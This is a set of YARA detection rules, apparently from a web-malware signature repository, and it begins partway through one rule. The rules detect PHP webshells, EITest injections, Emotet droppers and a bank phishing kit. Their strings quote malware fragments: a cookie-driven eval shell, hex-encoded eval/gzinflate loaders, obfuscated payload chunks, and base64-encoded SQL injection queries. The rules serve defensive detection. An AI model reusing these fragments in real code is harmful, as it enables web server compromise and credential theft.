      $s11 = "3ff4598a77cd3b841e67202e61574638995233aaa787934210a4ab15a630c50f2494d3ceb51eb7b5e307ef" ascii
      $s12 = "cd4631054dc8c28590b5779b9f4450bc8f0230bd9cd0a8c99ce3ad47d8a4f4f0a0987d2b6ebca4abc0d5f9d924fd281afe5a92615e5081603a7e012" ascii
      $s13 = "34ed5a34889217401c3f106bc6450cf7fd064ecb59db863eb4dcd92ad905fd860b7f20ce040cd5e0c9" ascii
      $s14 = "ba21b847ce13d294d502fcd1aef460ee83a997f54331990aa88399580cc9f12f5f8692111e7bf182fd" ascii
      $s15 = "$action = md5 ($action).substr (md5 (strrev ($action)), 0, strlen($action));" fullword ascii
      $s16 = "for($i = 0; $i < strlen ($data); $i = $i + 2) " fullword ascii
      $s17 = "function getEntries($data, $var = '') " fullword ascii
      $s18 = "675b29e6ac52f858c99539f530e73a1846dad5ae3d9b692addb219e443ba473ec7edf2" ascii
      $s19 = "fdeeb76550e5a5efb9fc7583444bf540d12a332666b75f1f4022aa52ddb27826a5451b5" ascii
      $s20 = "9471b94c07659f6362995205d302a441f2271cf6ed27256f3092e575464c80ad1cafe46436344df0d5825a740b32dfa9f18ee4" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-14
   Identifier: thumb
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule wp_timthumb_081418 {
   meta:
      description = "thumb - file wp-timthumb.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-14"
      hash1 = "d95f9d6ce28e16d1dc67d1bf0cd652f21922611556bead94c0645039be77a9c6"
   strings:
      $s1 = "<?php extract($_COOKIE);@$W(@$X($Y,$Z));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-26
   Identifier: shell1
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_26_18_shell1_index {
   meta:
      description = "shell1 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-26"
      hash1 = "4b00a6c47568876d81d3ffc1b9ae3721ffc4e91086f86d266526853d17e56c88"
   strings:
      $s1 = "header(\"location: 1.php?cmd=login_submit&id=$praga$praga&session=$praga$praga\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_08_26_18_shell1_ws00 {
   meta:
      description = "shell1 - file ws00.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-26"
      hash1 = "68bcfb4a9fe324ebbeed2e1c87e5670f5a776ea030d983a9d38fa8948d56a43d"
   strings:
      $s1 = "eval($_(" fullword ascii
      $s2 = "$_=\"\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\";" fullword ascii
      $s3 = "/*.*/"
      $s4 = "<?php"
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/*
    I first found this in May 2016, appeared in every PHP file on the
    server, cleaned it with `sed` and regex magic. Second time was
    in June 2016, same decoded content, different encoding/naming.
    https://www.symantec.com/security_response/writeup.jsp?docid=2015-111911-4342-99
*/
rule php_anuna_eitest
{
    meta:
        author      = "Vlad https://github.com/vlad-s"
        date        = "2016/07/18"
        description = "Catches a PHP Trojan"
    strings:
        $a = /<\?php \$[a-z]+ = '/
        $b = /\$[a-z]+=explode\(chr\(\([0-9]+[-+][0-9]+\)\)/
        $c = /\$[a-z]+=\([0-9]+[-+][0-9]+\)/
        $d = /if \(!function_exists\('[a-z]+'\)\)/
    condition:
        all of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-12-31
   Identifier: 12-31-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_12_31_18_Z605 {
   meta:
      description = "12-31-18 - file Z605.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-12-31"
      hash1 = "d7cfdc4f2964c9fd8c5a4e8949175d7ff8d7694165777b58e529a3c5da93f390"
   strings:
      $s1 = "<?php $_4d5CKq=\"0m5o049y3rvjw7a2c52nf0cp455oq4seaib3wuk52q0f9i0lulrhw5rrwb3m4g0kawgvqenafjmaqvw7ht3wn2p9m1hx\";$_voWgmO=array(1" ascii
      $s2 = "dr4//EDknH/FQ0+8Ju477U79yh3+RRJ6Njxlz65+EZ/Hc8Etp6u8nvoJP+ZV69aIc67+w+QX20+aPOOXb2BrrWy8dWBvIT4OvQfrFTdSm5Zdam2FTP3g6Y/8WkvCD1mN" ascii
      $s3 = "kfxXnm8GHeoZfJPmpX8A/7qWqfy7Yix/pkn5/qMcFfD2P/IUgzrx5XO3puRdFO09LM03og1m1Qz75KdlL1Lsi1E8o/iJ9aCP/EBWy2rf9cZDPaQI+2DZe91czm+evd/m" ascii
      $s4 = "v9Z3Fz6b+iG1l+6PxktQfTPkwt+kPi7f5+SN/LPwwl+azaX4IvxeX/AHevRyY/FlWLuTvbuWcLvxAkItZOYiJz7zDW3E7PpJLfGTzqX28sQ5Pgg+lR3xk9n16+L1+Fkv" ascii
      $s5 = "PRW8kOvPIFm5F8YvJ/VGr8pnz6cD/L1V/DOl3nA/0S1P8EfK8t+mS8dzqew3zDFzVX6U9ID8IvGetPq93aWq+8N8PMO8G+Am/ovib1lv9PX2/Jful/r5aG3Se+3PO95n" ascii
      $s6 = "B9EiQGf+5gfwCr0n+Qasfdziv+YDs1V6sST+JURoOR04BvMU+s5vP95sg1GozcYofIwfxZFGRfK0yq3wtdLpfTPGQ853Ow0zPHXcsYpnzPD3p33tSjucDm57f3nC/S+v" ascii
      $s7 = "Y0P5Wm3b/8b6jwmA8eC6kynfNLHX+k3TzSN/DXg+UvqmfyL/Yor4klhL1FTPSwv6M8UjkNw/9G+jH499vyd4ULX4y4/qlYYZTbb3D/VOK9+l8oF4KPMkTrcOa+0Mae56" ascii
      $s8 = "hwB9bpql+Q/pzQ/5eN16i9dOb+r/i+yV/i+KRCfiQFf4L+lNX/gD8u5ZPF/lIfn66XocfM84Gbf9U+GOe6FawKmSIeNlp5mEc7N9Fff8eAeuKfvsl5K2L71D3y50afNg" ascii
      $s9 = "yjzH7D2VFz6/sQ8L66In8k2f4S1jPfNCneMp9iZ3GH+7Yt9Z/+fz3jT+2cEfkn+D5qmlaGvBX5mRflH6XH+zHhOLNXJL/SPYpsmuKF32Kj33TT5W+Vv4V8m91Bn+O9BX" ascii
      $s10 = "g5+JeQWfKH08dnc6vfUP6ZEfPh/rLN9E+T+qT/y4qyDvwqSN8josc8sLxt7bbeKnuTSv7pnv9lK6XDnn9w6mKh3Fe7VHqvgnU84zdS+xouynypWNJ+0nnsypTircm9Pn" ascii
      $s11 = "kL6hncb8Z/PtpxXwwa8QDPG8qsYFPvSd5HWekf9R8ePdQH1b7C/wt60/lLyr9echnd+eJNJ9vZiSPEfTP4Eq/LOYLkn6cH8/TpIkvTvsZK1nj+cjQHfjCYS99nlfWkY+" ascii
      $s12 = "30,30,31,9,81);$payload=\"7L1bd6JatzX8lwBD2pPLZQQMKXBxmih3KLYiMlWSmNL467/RxwRFo6nUeqrW3u9u31U1S8NhzjHHsY8+BkEti6X9+ui45cxIDN++q7" ascii
      $s13 = "+TKxX71fXpwbfMfnPJC+OQP4JfJ1b4El4vWPk08nfroobPg/OLgP/LPhMZtZ/9uQ/sfwo/mbIN/ozKT5nPsIGH6RXZsLn04d9w3lEPaNH+hX9Qd8Szm/MTC8NLVUfC/a" ascii
      $s14 = "ZU9KvC5/r8XWu8K1KH6bjQoaknTl/D/067Hy26iFd79FbFW8Hvkw+39CHZX+a6A/ZPgT/ItkX4DW6n+m8Mf9t+HjoP1HnUdmjZX3vW6biNzRg38LO5w2dL843oX7c9I8" ascii
      $s15 = "6Z/tjzZ3SDY0S+5+NYG94f070odvUl7r6lORz18tVPQHztTH/uUJ+j/NjcXM+eV51zfYA9oL03Yf95fnWsKeYb431HaL/w0X/6Gtjz7r7e/u1/d2h3+Ue/TZTx32MnLJ" ascii
      $s16 = "b0+b9TvejtoGP7NafEK9fwOdCf+6hf8gf7c7bwPM9dPajMy8l+Di/Bfk60teFUVB8QM9TMR77jeKZHPqP5HdRMN+ejnj5JpbIN1/lf7laj0F/LOwh58s67ws+K+A7If8" ascii
      $s17 = "VPd8qKYPjWcmDg/X7mQcui7wa8arSAvajmIa8IHz2zSkojNmpKdZPkJ0aQbfHPvxG6B+Rwt7MVtSf5wmoVf9eQsvCXzutfJZHg8rqr+b5Ki2C01IE7pHOf7P+ivRfstI" ascii
      $s18 = "x0vVj8seFSCZmpOKTdv5G1fAjMh6xU+87ja/GR3m5Um/LpnKyZX7G5OO8IfQDkz09+DN0XoGnuO2c/xbPtj74R0m2I39gVRz5917JPyP5kfGF/CmdV/IfwF/hYB5MSfq" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 200KB and
         ( 8 of them )
      ) or ( all of them )
}

rule eitest_injection_0

{

	meta:
	 author= "Brian Laskowski"
	 date= "4/25/18"
	 description= "eitest malware injection"
	strings:
	 $a= "@error_reporting(0)"
	 $b= "!isset($eva1f"
	 $c= "?php"
	condition:
	all of them
}
rule eitest_injection_1

{

	meta:
	 author= "Brian Laskowski"
	 date= "4/25/18"
	 description= "eitest malware injection"
	strings:
	 $a= "bubE"
	 $b= "?php"
	 $c= "explode(chr"
	condition:
	all of them
}

/*
   YARA Rule Set
   Author: Brian Laskowski
   Date: 2020-10-13
   Identifier: 10-13-2020
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule webshells_10_13_2020_emotet {
   meta:
      description = "10-13-2020 - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2020-10-13"
      hash1 = "26c393cbef2f262c7be3b7dd4556b4a693b3e3c4c43e8a8c9ff02bff195a2985"
   strings:
      $x1 = "$contentData = '7PwHVFvJtjaKyu0csBtjgoltosmNQWCCoN0mRxOEyLTJiGSiABHadhubIDA5C5NBAmGCCBKhbZOjQQgshMDkKEQUGR7ee/c5++xz9j73v+//73n3" ascii
      $s2 = "NP4uiXA4WPLIrC4almgQRun/zA35G/lHvBQtvGdCLqb8x7GKnTLMAap7qH6huobHj2TNb702eNtVkAfmpwrsp1Y5PUN2J9+uEm4xhCUQkM0yGqP7DcLvEJZCWAZhORDY" ascii
      $s3 = "GGpUqP11AdInRNV7eOWSOUlvWC9iLsJmjTX7x05CYwLhWTKzCIkdK3IvmR3hFdzv4efLZ2jcqLqh77L8aDjHyLTv9lIttXT7Wk+ircaNlDfZX8dKoQ8LOGgzHQMaFRXR" ascii
      $s4 = "QFf0dUn8sWl4aJ1BeIy77dDTjPB+wkacsPUpIB59ovIQXJbDX/f0S1//cQDKgxlD0hFwBD8+ZmzjAA/A9hk154BhxQGV/uesPYoaDBCuiARbB1nW6sbi2t8b0zmy2UX4" ascii
      $s5 = "CNyBJ3ADjsAGWGE7GffMjf4b6x/Hoz37hJst0gET27/47zploID7T+NHey96Cw9yktz/kfA34kf7T6IVFqjAeho/Wrqh0Fs6fuLfi/8/pj/a+lG00hRqsIaR11TBkF+V" ascii
      $s6 = "B/P5+mIf2+hoAilx5GqxjwfFJNHEcEOm2MfFMJDLZsSHSHxlmMAPoaWqixPoFM0Op3DzxB6eUeQQk9mXxXmyNQkJpKePEYewM+ZG0K/SJT7hGtMS+nPE0TgmJDCZMWYT" ascii
      $s7 = "5EucPP3FP1T+vDrk7TDZ7VFED/oB2Lx63D9up2Gfuyf1yEseXeSPY8qtR1AWyuWXnsgXOlWOXgfrmpvsbktP5tVYSH7/c7tAqly7nWDUP/rHdBHwlDy5K98u0IYqu6QF" ascii
      $s8 = "9v0DjJu1nknNcMqIiuea3K52gp7CnmerdR3sgj199mvS7zQkurI5Gag++dzyIKS01mITjtHTcsIkc9jqxxtrx9k7+gGVDC3iTEWaIltKTXYVZlf7PuFcP0c4pzVbB9ab" ascii
      $s9 = "WP2U/B+KI7m8Q29V878SROY57w+EaI+utmq4I3yCm7Qqfwa2FIrCIMGPnyua2sLbq3TEb1UtL676+y19rDIzn2xfEDPCUjWqPz2XwispKH9SqOqWjvZ86tNMdl2t2d4y" ascii
      $s10 = "RFFA9aKNdFQf5DVFtPooQm+6sHrQEuUqr10Ou5iiNWMHzIovt+GkLARKhQREbW2HKvnFwH2WoAOYRnp/aJqvpL5OnduJC7KiO7ViuVCRFeMZIR5qbUb1v7P7quPBoaiA" ascii
      $s11 = "xXRNmVhQG0G1IcgeT+PDvp98ucuRzS+YzipbT4d9czn8wsHyLLtfh+VZZv/Fo0fjaa5UaweZyXWhUuNlj49ECMaWZNIF5UdOOy2UzTKCcGEZypO7WF2T2U6HUpny+rue" ascii
      $s12 = "/17YMPb4GA5HV5gpv09OaEYe1LyyjSdbWDB/W9OWLljzZwAavlNDLXraysMKqVScPbqmNL+f3fqChRbgTV3Zq71dHhWxLBNFioPXXfm0qZiokBHG5d7Ytq1QqwtU8DwQ" ascii
      $s13 = "U8jryQydo2RjDQqbogO8RAtiZeChDv5zYGBlam+Fe9smmQjf/BoY17z/bhn5an5nDjchmWkDK8seGR9zub1Ngv3KOOMWSdObW2hjWNZuBFmgETrIAs/qRvtg+dKBuE3n" ascii
      $s14 = "vPF6Op/Kky1fTHrUTvuHWsbIlrs+aP5MTn9a7nwgoQf6SyjVhiRb3/Ww9KFakeTpdbayx+sdUPvqIlvuRlChThArW+56IJ6SrSjZBsO+mEwshlT7YNnttAfU8SFPyQoC" ascii
      $s15 = "ypKN+PybUJ23AYR2JJK3YTwk2nDixivnw7yj68eYpAmzh6IGb/HNby0sUhYa7uBzlKRaWsDBlkftpVghxlD+r3s3q2jgNaRL5gQNLd0k5p9TWH+nwvdt1aYIlHFJMzr1" ascii
      $s16 = "QecU3bxPLnXEYT0DLlCbEC1c9uRasz1npmeUBw+vfkn4zJrAiXbOwQ9CPylGWxzel6beHipLVcDNP6T4X4zNJBkRDAuOVxGzCFJjWmRL5Kd3/3PT6v8ZBNQ5XKa2557w" ascii
      $s17 = "qfyi2w2YLPUuo+hOTrBDXF034K4mdZHzunJzLOPCgkY0jdizyvP6unssk876fiuepTfw9qxLj6+q4RwvO99qN/HlvvI0/5wv81uvT63e3seN+farZ/tGb88HeYEeKutq" ascii
      $s18 = "X0JiTMSyPhJUIJGhoLogwd2h9HBe2E5dsY91eBCPQVnzQuwTEMkOpBtVWEqUETsylE/bOEqiwgaZmJD5c8VBvHmxsXwj0+MSBA8iMWJtj0lwWVA42zhEb5wEl5kYkYJN" ascii
      $s19 = "hqhrusrgN3muzSfUOfzMPdjKGjpKYqLfzaLhSm/aGdjtfZzhW0N/NErv3bz5BUu7VmdYosPy9Fsg5t0NORTN+KltrVEoOYnKnzI2sMoLuG3+V2Wi9GPJQ51k/3s6DQR/" ascii
      $s20 = "QrWSXQC+aOxDptx1QOOMPNn1CMpdD6qpbLqEypO7rlQ7ufquYGxJNl2MqXay5W5P+kc0PtStZcoXE9Qeye4fYfqYnHkMGxeqv+zmk0y1Y1NdZc97RSF9V07/KKoH7XSs" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-03-01
   Identifier: 03-01-19
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://maxkersten.nl/binary-analysis-course/malware-analysis/emotet-droppers/
*/

/* Rule Set ----------------------------------------------------------------- */

rule emotet_dropper2 {
   meta:
      description = "03-01-19 - file emotet-dropper2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-03-01"
      hash1 = "0336745712f8e6c27dc7691c6d2bd938e8d4962c172f901124f18a9d8bd10ca8"
   strings:
      $s1 = "6576616c28677a696e666c617465286261736536345f6465636f64652822" ascii /* hex encoded string 'eval(gzinflate(base64_decode("' */
      $s2 = "echo $commandPart1 . \"[base64-encoded-value-here]\" . $commandPart2 . \"\\n\";" fullword ascii
      $s3 = "file_put_contents(\"/home/libra/Desktop/emotet/stage4.php\", (gzinflate(base64_decode(''))));" fullword ascii
      $s4 = "$commandPart1 = decode('6576616c28677a696e666c617465286261736536345f6465636f64652822');" fullword ascii
      $s5 = "echo \"Command equals:\\n\";" fullword ascii
      $s6 = "222929293b" ascii /* hex encoded string '")));' */
      $s7 = "$commandPart2 = decode('222929293b');" fullword ascii
      $s8 = "for ($i = 0, $n = strlen($stringToDecode); $i < $n; $i+= 2) {" fullword ascii
      $s9 = "$output.= pack('H*', substr($stringToDecode, $i, 2));" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule emotet_dropper3 {
   meta:
      description = "03-01-19 - file emotet-dropper3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-03-01"
      hash1 = "1673f455fb491289c298b4ff52a76e979da0531e93d65b93c922a80190f247ca"
   strings:
      $s1 = "$sp6345e2 = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';" fullword ascii
      $s2 = "private $contentName_ = 'iMDbapCVgUb.exe';" fullword ascii
      $s3 = "echo $sp58859d->execute();" fullword ascii
      $s4 = "'(?:Apple-)?(?:iPhone|iPad|iPod)(?:.*Mac OS X.*Version/(\\\\d+\\\\.\\\\d+)|;" fullword ascii
      $s5 = "header('Content-Type: ' . $this->contentType_);" fullword ascii
      $s6 = "header('Content-Disposition: attachment;" fullword ascii
      $s7 = ".*((?:Debian|Knoppix|Mint|Ubuntu|Kubuntu|Xubuntu|Lubuntu|Fedora|Red Hat|Mandriva|Gentoo|Sabayon|Slackware|SUSE|CentOS|BackTrack" fullword ascii
      $s8 = "'(?:(?:Orca-)?Android|Adr)[ /](?:[a-z]+ )?(\\\\d+[\\\\.\\\\d]+)'," fullword ascii
      $s9 = "private $content_ = '[omitted due to size]';" fullword ascii
      $s10 = "$sp7c7c2a = json_decode(fread($spdfc158, $spe8c644) , true);" fullword ascii
      $s11 = "ini_set('max_execution_time', 0);" fullword ascii
      $s12 = "?: Enterprise)? Linux)?(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?'," fullword ascii
      $s13 = "'VectorLinux(?: package)?(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?'," fullword ascii
      $s14 = "'CYGWIN_NT-5.2|Windows NT 5.2|Windows Server 2003 / XP x64'," fullword ascii
      $s15 = "'Darwin|Macintosh|Mac_PowerPC|PPC|Mac PowerPC|iMac|MacBook'" fullword ascii
      $s16 = "header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');" fullword ascii
      $s17 = "return base64_decode($this->content_);" fullword ascii
      $s18 = "'Arch ?Linux(?:[ /\\\\-](\\\\d+[\\\\.\\\\d]+))?'," fullword ascii
      $s19 = "header('Expires: Tue, 01 Jan 1970 00:00:00 GMT');" fullword ascii
      $s20 = "private $contentType_ = 'application/octet-stream';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}

rule emotet_dropper1 {
   meta:
      description = "03-01-19 - file emotet-dropper1.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-03-01"
      hash1 = "0311b2d34851ab3ba7f9f1ecd77a3bf0effbd52e8d4d2c20e30f9719bb7dcb9c"
   strings:
      $s1 = "6576616c28677a696e666c617465286261736536345f6465636f64652822" ascii /* hex encoded string 'eval(gzinflate(base64_decode("' */
      $s2 = "222929293b" ascii /* hex encoded string '")));' */
      $s3 = "$n5c62c1bcb81d1 = fn5c62c1bcb819b('6576616c28677a696e666c617465286261736536345f6465636f64652822');" fullword ascii
      $s4 = "eval($n5c62c1bcb81d1" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-12-22
   Identifier: 12-22-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */
rule _home_hawk_infected_12_22_19_image {
   meta:
      description = "12-22-19 - file image.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "ed4e15e61e44506cd384524c8548522f30c9ff9635bb37fb4dcb8c73764ede85"
   strings:
      $s1 = "/*4fdde239a36aa4d71f1e9570d9228bdc5f49b6de01950679e52f8b26a6fe32b4 */?><?php $ZpvfC9758 = \"/mhol(x8v6fzu.5iryn*bq49gesd3_20tkpw" ascii
      $s2 = "k/iOZ2gEZbaI3gTK4giWlqT472T9/tHO9ZsqlERni1p3Zv5JDAO/b7MzxQTQWCSOp8BTtOp2/sUBFDZK8m0VVg51M1shDLlRgFBd5TtnfqG2+evzH24w2UbBCg2V49Lk" ascii
      $s3 = "iozkP/lT90J+W4zX3XKZtb0KOG7bnDSasH/eYE7a2BH4yNsRON/H5r6odR+w0Q09wP+hvGljuZziIjupk6rSn/akzsMXtry8nhrAuoGle2N3NaVrtttbfWEDL8gSrbNK" ascii
      $s4 = "3HnFFMmK7HfdeuNGsOdRrbG11loggk3rDUa7GdmS7GE+s3Ftg4/4KGW+NEe7VME3OtwmcTxR0gdc2VTrZQAoTYMKQwwnvkbmHw2CPYTK5T2OTur7CmRX5wU0MnoPJqQx" ascii
      $s5 = "u6Fk+wXEDA6qKA9G15gBBRNwxnTm3iRCokin6jO23OrHt0Ej6YeYnpzLCH5hEe/ct+AgFYY/sSjVimZAMDUhraxUxvohG20wpm3Rv4E9nAlqzh3y7m6SZ/mvB3QpDIyw" ascii
      $s6 = "RRCHPrhCzGhYUuNzwkaNbyJ8m+YelibA7E1KyRPZLJIjAKaxBIpQlNlGChL7dJFya1rM9J2heLjBEtDLl4TuWL0KDd7ieMy8jMkOykr/I6Ro18GBPnRpKXGTQJKPidL4" ascii
      $s7 = "4fdde239a36aa4d71f1e9570d9228bdc5f49b6de01950679e52f8b26a6fe32b4" ascii
      $s8 = "lEmJZTNKt6LGiSc4TPWfAxotM5VpLgTVXq6oyzDIOhUmKYKcEbinWdW0hOsUJEQoGlwj9qomgEVqsrzLBhqUOp8BdhtYKmBR0cWpI6BMWVpnY0gg9EuTDSzGohZ35NWn" ascii
      $s9 = "935/0NXEzzuvixhbmeUg9s0AzF9RfkVIQPY9dvW0mPYQp82Zr4UEZaoiXRpVI1QDRuNOsEJ6EgzJ0s+6g7iewAFrBWp+vZk8v2uSrVUB9urVFFW7wyWroQaNlgr7jQ4X" ascii
      $s10 = "lBGDLXttbsmHtJ3ccYXHIMbp2d7q8+wtVZMeaD95dHB49Wj+NfZ/irN3308GHCO/xprBVTxgMa6ti9UTmpzg6hPyNnLE97pTSai2z5xEi43ZZp1ahIDUQ5q5ZV4LValP" ascii
      $s11 = "SlEIHTe4PWQ+XSRAnrQH1wRQFOXEi8Uk2pyqmcEmq0LaKOmiABbhh8pySfz3IgQrC/qhpksQlLRdb+QQEPGAldeQqcOmVSOGEkDdYVY6/BkGOAKOCFDOpL6khY7iFLdL" ascii
      $s12 = "<?php /*2f2512d8c52ceb5320bf4012b2bbeb10b41209ab*/" fullword ascii
      $s13 = "if ($_SERVER[\"QUERY_STRING\"]) { exit($_SERVER[\"QUERY_STRING\"]); }" fullword ascii
      $s14 = "7uzf8H'\".$zwZxFb7128));$c255($Q8500,array('','}'.$Tx4853.'//'));" fullword ascii
      $s15 = "2f2512d8c52ceb5320bf4012b2bbeb10b41209ab" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 80KB and
         ( 8 of them )
      ) or ( all of them )
}

rule _home_hawk_infected_12_22_19_user_emotet {
   meta:
      description = "12-22-19 - file user.php Emotet php serverside downloader file"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-12-22"
      hash1 = "30ed790766929a1be2d3a0095be41f3a1b7819505b826f779e109396236bad75"
   strings:
      $s1 = "goto" fullword ascii
      $s2 = "<?php function" fullword ascii
      $s3 = "if ($_SERVER[\"QUERY_STRING\"]) { exit($_SERVER[\"QUERY_STRING\"]); }" fullword ascii
      $s4 = "63e110ac5f971e41e77ef127575337d8aaeeae3b" ascii
      $s5 = "be5a8488b06f0640a63c80223a12d13e3d309f4d" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 2 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-25
   Identifier: phishing
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_25_18_crd_phishing_index {
   meta:
      description = "phishing - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "ab9aaaef4c579a9dd2449adb375287ad4330437cfff5495769cee4aac4e16e9b"
   strings:
      $s1 = "while(false !== ( $file = readdir($dir)) ) {" fullword ascii
      $s2 = "include('entreeBam/antibots.php');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}


/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-25
   Identifier: entreeBam
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_25_18_sms {
   meta:
      description = "entreeBam - file sms.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "d46fdda25dfa2de941727a2848716a6d0c840803d50d88003659c82452fe86fa"
   strings:
      $s1 = "$browser = getenv (\"HTTP_USER_AGENT\");" fullword ascii
      //$s2 = "$to = \"razinekhaled@gmail.com\";" fullword ascii
      $s3 = "$message .= \"Certicode : \".$_POST['tel'].\"\\n\";" fullword ascii
      $s4 = "$ip = getenv(\"REMOTE_ADDR\");" fullword ascii
      $s5 = "header(\"Location: https://www.credit-agricole.fr/\");" fullword ascii
      $s6 = "$message .= \"-------------| ANASH  |-------------\\n\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-28
   Identifier: shells
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_188_120_231_151_2018_01_07a_shells_fack {
   meta:
      description = "shells - file fack.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "a2281fdbfeb4e0bef66c0d174fff9719253ff712c1b3d8cc554a5e6ac3caee89"
   strings:
      $s1 = "$fack = 'CgoKZXJyb3JfcmVwb3J0aW5nKDApOwovL2Vycm9yX3JlcG9ydGluZyhFX0FMTCk7CnNldF90aW1lX2xpbWl0KDApOwoKCgpjbGFzcyBJbmplY3RvckNvbXB" ascii
      $s2 = "oc2VsZWN0KzErZnJvbShzZWxlY3QrY291bnQoKiksY29uY2F0KChzZWxlY3QrKHNlbGVjdCsoU0VMRUNUK2Rpc3RpbmN0K2NvbmNhdCgweDdlLDB4MjcsJTI3b2xvbG8" ascii /* base64 encoded string 'select+1+from(select+count(*),concat((select+(select+(SELECT+distinct+concat(0x7e,0x27,%27ololo' */
      $s3 = "0K2NvbmNhdCgweDdlLDB4MjcsJTI3b2xvbG8lMjcsMHgyNywweDdlKStGUk9NK2luZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YStMSU1JVCsxKSkrZnJvbStpbmZvcm1" ascii /* base64 encoded string '+concat(0x7e,0x27,%27ololo%27,0x27,0x7e)+FROM+information_schema.schemata+LIMIT+1))+from+inform' */
      $s4 = "zNTM2LDB4MzEzMDMyMzUzNDM4MzAzMDM1MzYsMHgzMTMwMzIzNTM0MzgzMDMwMzUzNiwoc2VsZWN0IGRpc3RpbmN0IGNvbmNhdCgweDdlLDB4MjcsdW5oZXgoSGV4KGN" ascii /* base64 encoded string '536,0x31303235343830303536,0x31303235343830303536,(select distinct concat(0x7e,0x27,unhex(Hex(c' */
      $s5 = "IRUNLIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKENBU1QoSUQgQVMgQ0hBUiksJyAnKSwnanphcnF0JyxJRk5VTEwoQ0FTVChJU19QRVJJT0QgQVMgQ0hBUik" ascii /* base64 encoded string 'ECK AS CHAR),' '),'jzarqt',IFNULL(CAST(ID AS CHAR),' '),'jzarqt',IFNULL(CAST(IS_PERIOD AS CHAR)' */
      $s6 = "faWQ9MiBVTklPTiBBTEwgU0VMRUNUIChTRUxFQ1QgQ09OQ0FUKCdxdmtxcScsSUZOVUxMKENBU1QoQUNUSVZFIEFTIENIQVIpLCcgJyksJ2p6YXJxdCcsSUZOVUxMKEN" ascii /* base64 encoded string 'id=2 UNION ALL SELECT (SELECT CONCAT('qvkqq',IFNULL(CAST(ACTIVE AS CHAR),' '),'jzarqt',IFNULL(C' */
